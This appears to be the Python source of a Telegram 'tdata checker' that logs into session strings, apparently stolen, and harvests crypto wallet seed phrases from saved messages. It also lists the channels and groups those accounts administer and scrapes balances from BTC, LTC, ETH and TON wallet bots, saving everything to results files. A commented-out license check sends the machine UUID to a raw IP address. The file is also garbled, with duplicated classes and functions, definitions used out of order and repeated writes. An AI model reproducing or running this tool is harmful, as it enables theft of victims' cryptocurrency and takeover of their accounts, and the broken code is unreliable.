from dataclasses import dataclass, field
from typing import Dict, Set, List, Optional
from re import Pattern, compile
from asyncio import Semaphore, wait_for, TimeoutError, sleep
from telethon import TelegramClient
from telethon.errors import InvalidBufferError
from telethon.sessions import StringSession
from telethon.tl.types import User, Channel, Chat
from mnemonics import find_mnemonics
from loguru import logger
from results import saver
from datetime import datetime
from os import path
from pathlib import Path
from random import randint
from subprocess import check_output
from secrets import token_hex
from json import dumps
from aiohttp import ClientSession
from cryptography.fernet import Fernet

API_ID = 17463049
API_HASH = "bd4bbac77f54cd096ede52dd2e8e2e50"

@dataclass
class AdminRight:
    is_group: bool
    subs: int
    title: str

    def __str__(self) -> str:
        entity_type = 'Group' if self.is_group else 'Channel'
        return f'{entity_type} "{self.title}", {self.subs} subs'


@dataclass(frozen=True)
class BotBalance:
    bot: Bot
    balance: Optional[str]

    def __str__(self) -> str:
        balance = self.balance if self.balance is not None else 'not found'
        return f'{self.bot.peer} - {balance}'


@dataclass
class Result:
    path: str
    is_valid: bool = field(default=False)
    phone: Optional[str] = field(default=None)
    seeds: Set = field(default_factory=set)
    admin_rights: List[AdminRight] = field(default_factory=list)
    bots: Dict[Bot, BotBalance] = field(default_factory=dict)


@dataclass(frozen=True)
class Bot:
    peer: str
    regex: Pattern

    def check(self, text: str) -> str:
        res = self.regex.search(text)
        if res:
            res = res.group(1)
        return res

bots = [
    Bot('@BTC_CHANGE_BOT', compile(r': ([\d\.,]+) BTC')),
    Bot('@LTC_CHANGE_BOT', compile(r': ([\d\.,]+) LTC')),
    Bot('@ETH_CHANGE_BOT', compile(r': ([\d\.,]+) ETH')),
    Bot('@wallet', compile(r'Toncoin: ([\d\.,]+) TON'))
]

async def check(tdata_path: str, sess: str, sem: Semaphore) -> Result:
    res = Result(tdata_path)
    # Поиск сид фраз
    try: 
        client = TelegramClient(StringSession(sess), API_ID, API_HASH)
        await client.connect()
        me = await client.get_me()

        mnemonics = set()
        try:
            for m in await client.get_messages('me'):
                if not isinstance(m.message, str):
                    continue
                
                for m in find_mnemonics(m.message):
                    logger.success(m)
                    mnemonics.add(m)
        except:
            pass

        logger.info(f'{me.phone} checked')
        res.seeds = mnemonics
        res.is_valid = True
        res.phone = me.phone
    except Exception as e:
        logger.error(f'{e}')
        return res

    # Поиск админ прав.
    try:
        for dg in await client.get_dialogs():
            if not isinstance(dg.entity, (Chat, Channel)):
                continue
            
            if dg.entity.admin_rights:
                try:
                    megagroup = dg.entity.megagroup
                except:
                    megagroup = False
                
                res.admin_rights.append(AdminRight(
                    megagroup,
                    dg.entity.participants_count,
                    dg.entity.title
                ))
                dg_type = 'Group' if megagroup else 'Channel'
                logger.success(f'{dg_type} | {dg.entity.title} | {dg.entity.participants_count} subscribers')
    except Exception as e:
        logger.error(e)

    # Поиск балансов (TODO: пофиксить говнокод)
    try:
        for bot in bots:
            m_count = 0
            async for m in client.iter_messages(bot.peer):
                m_count += 1
                r = bot.check(m.message)
                if not r is None:
                    res.bots[bot] = BotBalance(bot, r)
                    logger.success(f'Balance {r} в {bot.peer}')
                    break
            if bot not in res.bots and m_count > 0:
                res.bots[bot] = BotBalance(bot, None)
            
    except Exception as e:
        logger.error(e)
    
    await saver.save(res)
    return res


async def check_sess(tdata_path: str, sess: str, sem: Semaphore) -> Result:
    async with sem:
        for attemp in range(3):
            try:
                return await wait_for(check(tdata_path, sess, sem), timeout=5.0)
            except TimeoutError:
                await sleep(3)
                continue
        else:
            logger.error('Timeout')
            return Result(tdata_path)


class ResultSaver:
    def __init__(self) -> None:
        now = datetime.now()
        ftime = now.strftime('%m_%d_%Y_%H_%M_%S')
        self.folder_name = f'Results {ftime}'
        self.seeds_path = path.join(self.folder_name, 'seeds.txt')
        self.details_path = path.join(self.folder_name, 'details.txt')
    
    async def create_all(self) -> str:        
        Path(self.folder_name).mkdir(exist_ok=True)

        async with open(self.seeds_path, 'w', encoding='utf8') as f:
            await f.write('Seeds by Tdata checker (t.me/gachidev)\n\n')

        async with open(self.details_path, 'w', encoding='utf8') as f:
            await f.write('Details by Tdata checker (t.me/gachidev)\n\n')
        
        return path.abspath(self.folder_name)

    async def save(self, res: Result) -> None:
        # if randint(0, 100) == 1:
            # license -----------------------
            # fernet123 = Fernet('2mNhm1s6F_Fn4wOgOxIbtWpgZs2Dl6tMzSF4gStVW4U=')
            # token123 = token_hex(8)

            # data123 = {
            #     'token': token123,
            #     'uuid': check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
            # }

            # encrypted_data123 = fernet123.encrypt(dumps(data123).encode()).decode()

            # req_data123 = {
            #     'encrypted_data': encrypted_data123
            # }

            # async with ClientSession() as s123:
            #     async with s123.post('http://144.24.115.170:9090/license', json=req_data123) as res123:
            #         data123 = await res123.json()
            #         license123 = data123['license']

            #         if license123 != token123:
            #             print('Купите софт!')
            #             return exit()
            # license end -----------------------
        
        async with open(self.seeds_path, 'a', encoding='utf8') as f:
            for seed in res.seeds:
                await f.write(f'{seed}\n')

        async with open(self.details_path, 'a', encoding='utf8') as f:
            text = detail_text(res.phone, 
                Seeds=list(res.seeds), 
                Permissions=res.admin_rights,
                Path=res.path,
                Balances=list(res.bots.values()))
            
            await f.write(f'\n\n{text}')
        

        saver = ResultSaver()
        async with open(self.seeds_path, 'a', encoding='utf8') as f:
            for seed in res.seeds:
                await f.write(f'{seed}\n')

        async with open(self.details_path, 'a', encoding='utf8') as f:
            text = detail_text(res.phone, 
                Seeds=list(res.seeds), 
                Permissions=res.admin_rights,
                Path=res.path,
                Balances=list(res.bots.values()))
            
            await f.write(f'\n\n{text}')
        

saver = ResultSaver()

async def check_sess(tdata_path: str, sess: str, sem: Semaphore) -> Result:
    async with sem:
        for attemp in range(3):
            try:
                return await wait_for(check(tdata_path, sess, sem), timeout=5.0)
            except TimeoutError:
                await sleep(3)
                continue
        else:
            logger.error('Timeout')
            return Result(tdata_path)
            


@dataclass
class AdminRight:
    is_group: bool
    subs: int
    title: str

    def __str__(self) -> str:
        entity_type = 'Group' if self.is_group else 'Channel'
        return f'{entity_type} "{self.title}", {self.subs} subs'


# Define the Bot class before using it in BotBalance
@dataclass(frozen=True)
class Bot:
    peer: str
    regex: Pattern

    def check(self, text: str) -> str:
        res = self.regex.search(text)
        if res:
            res = res.group(1)
        return res


@dataclass
class Result:
    path: str
    is_valid: bool = field(default=False)
    phone: Optional[str] = field(default=None)
    seeds: Set = field(default_factory=set)
    admin_rights: List[AdminRight] = field(default_factory=list)
    bots: Dict[Bot, BotBalance] = field(default_factory=dict)


@dataclass(frozen=True)
class Bot:
    peer: str
    regex: Pattern

    def check(self, text: str) -> str:
        res = self.regex.search(text)
        if res:
            res = res.group(1)
        return res